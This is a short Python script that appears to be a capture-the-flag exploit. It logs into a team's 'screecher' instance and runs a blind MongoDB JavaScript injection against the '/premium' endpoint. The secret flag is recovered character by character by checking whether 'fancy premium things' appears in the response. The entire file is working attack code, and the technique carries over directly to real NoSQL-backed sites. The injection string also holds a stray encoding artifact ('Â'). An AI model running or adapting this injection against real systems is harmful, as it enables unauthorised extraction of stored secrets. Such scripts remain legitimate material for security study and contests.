import sys
import string
import datetime
import requests


sess_team	= '0'
sess_user	= 'blind_mongo_ex'
sess_pass	= 'blind_mongo_ex'
sess_domain	= 'team%s.screecher.de' % sess_team
sess_url	= 'https://%s' % sess_domain

char_map	= 'abcdef' + ''.join([str(i) for i in range(0, 10)]) + '}'


def match(session, buffer):
	injection = '" || this.secret.toLowerCase().startsWith("%s")Â || "a"=="' % buffer
	print(injection)
	access_r = session.post('%s/premium' % sess_url, data={
		'access': injection
	})
	return ('fancy premium things' in access_r.text)


if __name__ == '__main__':

	print('Attempting to login at screecher instance...')

	session = requests.Session()
	login_r = session.post('%s/login' % sess_url, data={
		'user': sess_user, 'pwd': sess_pass
	})
	print(str(login_r.status_code))

	if (login_r.status_code == 200):

		char_index = 5
		char_buffer = 'SWAG{'

		while not char_buffer.endswith('}'):

			char_index += 1
			success = False

			print("Trying to get character at index %d..." % char_index)

			for current_char in char_map:
				if match(session, char_buffer + current_char):
					success = True
					char_buffer += current_char
					print("Success! Buffer %s" % char_buffer)
					break

			if not success:
				print('Failed to find character at index %d! Aborting...' % char_index)
				sys.exit(-1)


		print('Acquired buffer: %s' % char_buffer)

		print('Attempting logout...')
		log_res = session.get('%s/logout' % sess_url)
		print(str(log_res.status_code))
